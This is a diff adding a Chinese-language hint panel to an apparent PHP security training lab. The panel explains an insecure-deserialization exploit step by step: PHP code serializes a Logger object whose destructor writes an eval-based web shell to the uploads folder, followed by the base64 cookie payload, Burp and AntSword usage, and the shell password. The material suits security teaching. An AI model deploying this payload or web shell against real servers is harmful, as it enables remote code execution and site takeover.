@@ -1,0 +1,29 @@
+<div class="hint-thought">
+<h4>思路提示</h4>
+<p>反序列化的核心是<b>Cookie 中的序列化数据可控</b>，服务端 <code>unserialize()</code> 还原时会触发类的魔术方法。思路：找到能利用的魔术方法链（本关是 <code>Logger::__destruct</code> 写文件），构造一个序列化对象，设置好目标文件路径和内容，base64 编码后替换 Cookie。注意 <code>__destruct</code> 在请求结束时执行，且 PHP 会把工作目录重置，所以写文件必须用<b>绝对路径</b>。</p>
+</div>
+<details class="hint-detail">
+<summary>详细解题过程（点击展开）</summary>
+<div>
+<b>利用思路：</b>Cookie 完全可控 → 构造 Logger 对象序列化串 → base64 → 替换 Cookie → 页面结束 __destruct 自动写文件。<br>
+<b>第一步 - 生成 payload（logfile 必须是上传目录的绝对路径，下方 {{UPLOAD_DIR}} 会替换为本靶场的实际上传目录）：</b>
+<pre>&lt;?php
+class Logger {
+    public $logfile = '{{UPLOAD_DIR}}/uns_shell.php';
+    public $msg = '&lt;?php @eval($_POST[cmd]);?&gt;';
+}
+echo base64_encode(serialize(new Logger()));</pre>
+<b>示例输出（部署路径取 <code>D:/phpStudy/WWW/bafanglab</code> 时）：</b>
+<pre class="code-wrap-pre">Tzo2OiJMb2dnZXIiOjI6e3M6NzoibG9nZmlsZSI7czo0NzoiRDovcGhwU3R1ZHkvV1dXL2JhZmFuZ2xhYi91cGxvYWRzL3Vuc19zaGVsbC5waHAiO3M6MzoibXNnIjtzOjI3OiI8P3BocCBAZXZhbCgkX1BPU1RbY21kXSk7Pz4iO30=</pre>
+<b>对应的序列化原文：</b>
+<pre class="code-wrap-pre">O:6:"Logger":2:{s:7:"logfile";s:47:"D:/phpStudy/WWW/bafanglab/uploads/uns_shell.php";s:3:"msg";s:27:"&lt;?php @eval($_POST[cmd]);?&gt;";}</pre>
+（base64 里的长度标记 <code>s:47</code>、<code>s:27</code> 与真实字符串长度必须一致。把 <code>D:/phpStudy/WWW/bafanglab</code> 换成为你自己的安装路径后，路径长度会变，需按上面的代码重新生成整串，不能只改路径不改数字）<br>
+<b>第二步 - 替换 Cookie：</b>F12 或 Burp 把 <code>prefs</code> Cookie 改成上面的 base64 整串，刷新本页。<br>
+<b style="color:var(--danger)">重要：</b>base64 中若含 <code>+</code> 或 <code>=</code>，放入 Cookie 前必须 URL 编码
+（<code>+</code> &rarr; <code>%2B</code>，<code>=</code> &rarr; <code>%3D</code>），否则 PHP 解析 Cookie 时 + 变空格，payload 损坏；本例末尾的 <code>=</code> 编码为 <code>%3D</code> 更稳妥。<br>
+<b>第三步 - 验证：</b>刷新后页面提示"偏好对象已反序列化（非 UserPrefs 类型）"，<code>uploads/uns_shell.php</code> 被写入，内容为 <code>&lt;?php @eval($_POST[cmd]);?&gt;</code>；<br>
+访问 <code>{{SITE}}/uploads/uns_shell.php</code> 用蚁剑连接（URL 同上，连接密码 <code>cmd</code>，编码器默认）。<br>
+<b>教学点：</b>PHP 在请求关闭阶段执行 __destruct 前会把工作目录重置为 PHP 安装目录，<br>
+所以 __destruct 中使用相对路径写文件往往会"写丢"——真实漏洞利用时一律用绝对路径。
+</div>
+</details>
